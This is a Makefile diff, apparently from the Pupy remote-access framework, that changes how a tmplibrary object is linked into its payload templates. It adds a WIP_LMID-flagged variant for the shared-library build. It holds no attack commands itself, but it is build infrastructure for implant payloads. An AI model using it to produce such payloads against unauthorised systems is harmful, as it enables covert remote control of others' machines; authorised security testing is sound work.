@@ -59,7 +59,7 @@ PYTHON ?= python
 TEMPLATE_OUTPUT_PATH ?= ../../pupy/payload_templates/
 
 PYOBJS := _memimporter.o Python-dynload.o pupy_load.o pupy.o
-COMMON_OBJS := list.o tmplibrary.o daemonize.o decompress.o
+COMMON_OBJS := list.o daemonize.o decompress.o
 
 ifeq ($(UNCOMPRESSED),)
 COMMON_OBJS += LzmaDec.o
@@ -90,6 +90,9 @@ revision.h:
 pupy.o: resources/$(ARCH)/library.c revision.h
 pupy_load.o: resources/bootloader.c resources/$(ARCH)/python27.c \
 	resources/$(ARCH)/libssl.c resources/$(ARCH)/libcrypto.c revision.h
+
+tmplibrary_lmid.o: tmplibrary.c
+	$(CC) -c -o $@ $< $(CFLAGS) -DWIP_LMID
 
 import-tab.c import-tab.h: mktab.py
 	$(PYTHON) $(PFLAGS) $<
@@ -153,10 +156,10 @@ resources/$(ARCH)/libssl.c: ../gen_resource_header.py resources/$(ARCH)/libssl.s
 resources/$(ARCH)/libcrypto.c: ../gen_resource_header.py resources/$(ARCH)/libcrypto.so
 	$(PYTHON) $(PFLAGS) $+ $@ $(COMPRESSED) $(XZARGS)
 
-$(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).$(SUFFIX): main_exe.o $(PYOBJS) $(COMMON_OBJS)
+$(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).$(SUFFIX): main_exe.o $(PYOBJS) $(COMMON_OBJS) tmplibrary.o 
 	$(CC) $(PIE) $+ -o $@ $(LDFLAGS)
 
-$(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).$(SUFFIX).so: main_so.o $(PYOBJS) $(COMMON_OBJS)
+$(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).$(SUFFIX).so: main_so.o $(PYOBJS) $(COMMON_OBJS) tmplibrary_lmid.o 
 	$(CC) -shared $+ -o $@ $(LDFLAGS) -Wl,-soname,pupyx$(NAME).$(SUFFIX).so
 
 .PHONY: clean all
